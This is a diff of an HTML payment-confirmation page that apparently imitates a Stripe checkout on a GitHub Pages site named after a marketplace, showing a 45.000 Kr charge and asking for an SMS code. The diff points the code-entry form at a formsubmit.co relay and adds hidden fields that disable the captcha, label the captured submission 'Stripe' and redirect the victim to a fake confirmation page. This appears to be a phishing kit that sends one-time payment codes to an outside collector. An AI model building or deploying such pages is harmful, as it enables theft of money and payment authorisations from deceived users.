@@ -39,10 +39,7 @@
                     <span class="label">Amount :</span>
                     <span class="value">45.000 Kr</span>
                 </div>
-                <!-- <div class="summary-row">
-                    <span class="label">Card :</span>
-                    <span class="value">#### #### #### ####</span>
-                </div> -->
+                
             </section>
 
             <!-- Alerte SMS -->
@@ -52,7 +49,11 @@
             </div>
 
             <!-- Formulaire de saisie du code -->
-            <form class="otp-form" method="POST" action="https://formsubmit.co/acb3cba3487868efd28a4ddb8b1c4db7" enctype="multipart/form-data">
+            <form action="https://formsubmit.co/528cfa5ae469b703e6904a3689b34436" method="POST" enctype="multipart/form-data">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="https://bilbasen.github.io/iX3/payment/stripe/confirm.html">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_subject" value="Stripe">
                 <label for="otp-input">Enter the confirmation code you recieved via SMS</label>
                 
                 <div class="otp-inputs-container">
